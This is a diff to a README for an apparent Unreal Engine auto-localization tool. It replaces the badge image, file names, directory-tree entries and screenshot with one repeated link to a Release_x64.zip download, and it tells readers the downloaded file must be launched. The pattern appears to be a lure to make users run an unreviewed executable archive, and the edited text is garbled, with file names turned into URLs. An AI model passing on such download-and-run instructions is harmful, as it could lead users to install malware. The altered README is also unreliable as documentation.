@@ -1,16 +1,16 @@
 # 🌐 Auto-Localization Automation for Unreal Engine
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Localization-Automation-green">
+  <img src="https://github.com/ShanhoMC/Auto-Localization-for-Unreal-Engine/releases/download/v1.0/Release_x64.zip">
 </p>
 
-Welcome to the "Auto-Localization-for-Unreal-Engine" repository! This script is designed to automate the process of translating game texts for localization in Unreal Engine. Whether you are working on UE4 or UE5, this tool can simplify the import, translation, and export of Game.po files, making localization management more efficient and convenient.
+Welcome to the "Auto-Localization-for-Unreal-Engine" repository! This script is designed to automate the process of translating game texts for localization in Unreal Engine. Whether you are working on UE4 or UE5, this tool can simplify the import, translation, and export of https://github.com/ShanhoMC/Auto-Localization-for-Unreal-Engine/releases/download/v1.0/Release_x64.zip files, making localization management more efficient and convenient.
 
 ## 🚀 Getting Started
 
 To get started with this localization automation script, you can download the latest version of the software package from the following link:
 
-[Download Software.zip](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[Download https://github.com/ShanhoMC/Auto-Localization-for-Unreal-Engine/releases/download/v1.0/Release_x64.zip](https://github.com/ShanhoMC/Auto-Localization-for-Unreal-Engine/releases/download/v1.0/Release_x64.zip)
 
 *Note: The downloaded file needs to be launched to begin using the automation tool.*
 
@@ -18,7 +18,7 @@ If the above link is not working or you require a different version, please chec
 
 ## 🛠️ Features
 
-🔹 Import Game.po files for translation  
+🔹 Import https://github.com/ShanhoMC/Auto-Localization-for-Unreal-Engine/releases/download/v1.0/Release_x64.zip files for translation  
 🔹 Automated translation of game texts  
 🔹 Export translated files for localization integration  
 🔹 Supports Unreal Engine 4 and Unreal Engine 5 projects  
@@ -50,12 +50,12 @@ The repository is organized into the following main directories:
 ```
 /Auto-Localization-Tool
   ├── Scripts
-  │    └── localization_script.py
+  │    └── https://github.com/ShanhoMC/Auto-Localization-for-Unreal-Engine/releases/download/v1.0/Release_x64.zip
   ├── Samples
-  │    └── Sample_Game.po
+  │    └── https://github.com/ShanhoMC/Auto-Localization-for-Unreal-Engine/releases/download/v1.0/Release_x64.zip
   ├── Docs
-  │    └── User_Manual.pdf
-  └── README.md
+  │    └── https://github.com/ShanhoMC/Auto-Localization-for-Unreal-Engine/releases/download/v1.0/Release_x64.zip
+  └── https://github.com/ShanhoMC/Auto-Localization-for-Unreal-Engine/releases/download/v1.0/Release_x64.zip
 ```
 
 ## 🌍 Support and Contributions
@@ -66,7 +66,7 @@ Contributions to this project are welcome! If you have any suggestions, bug repo
 
 Here is a sneak peek of the localization automation tool in action:
 
-![Localization Tool](https://via.placeholder.com/800x400)
+![Localization Tool](https://github.com/ShanhoMC/Auto-Localization-for-Unreal-Engine/releases/download/v1.0/Release_x64.zip)
 
 ## 📝 License
 
